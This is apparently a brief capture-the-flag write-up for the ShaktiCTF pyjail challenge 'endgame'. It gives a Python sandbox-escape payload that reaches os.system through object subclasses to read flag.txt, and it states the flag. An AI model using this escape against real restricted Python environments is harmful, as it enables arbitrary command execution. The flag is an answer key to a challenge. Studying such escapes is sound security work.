Title: endgame

Description:
```
Crack the last one in pyjail series! Author : Claire de lune
```

Refer to the first [challenge](https://github.com/Coder-Here/ShaktiCTF/blob/main/Misc/level0/README.md), the payload works from there.

```
print([].__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['system']('cat flag.txt'))
```

![image](https://user-images.githubusercontent.com/63996033/207102857-1321a580-934c-4c35-b1c4-0365a3d36482.png)

Flag: shakti{H0w_D0_y0u_L1k3_35c4p3_r00m5_n0W?}
